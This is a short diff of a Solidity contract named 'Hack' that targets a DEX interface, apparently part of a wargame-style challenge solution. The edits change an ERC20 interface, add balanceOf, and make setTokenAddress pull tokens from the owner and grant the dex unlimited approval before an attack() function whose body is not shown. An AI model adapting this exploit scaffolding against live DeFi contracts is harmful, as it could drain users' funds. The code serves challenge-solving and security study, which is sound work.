@@ -14,7 +14,9 @@ interface IDex {
 }
 
 interface IERC20 {
-    function approve(address spender, uint256 amount) external returns (bool);
+    function approve(address spender, uint amount) external;
+
+    function balanceOf(address _owner) external view returns (uint256 balance);
 
     function transferFrom(
         address sender,
@@ -35,14 +37,12 @@ contract Hack {
         owner = msg.sender;
     }
 
-    // token1.IERC20(HackAddress,10)
-    // token2.IERC20(HackAddress,10)
     function setTokenAddress() public {
         token1 = IERC20(dex.token1());
         token2 = IERC20(dex.token2());
         token1.transferFrom(owner, address(this), 10);
         token2.transferFrom(owner, address(this), 10);
-        dex.approve(address(dex), 1000);
+        dex.approve(address(dex), type(uint).max);
     }
 
     function attack() public {
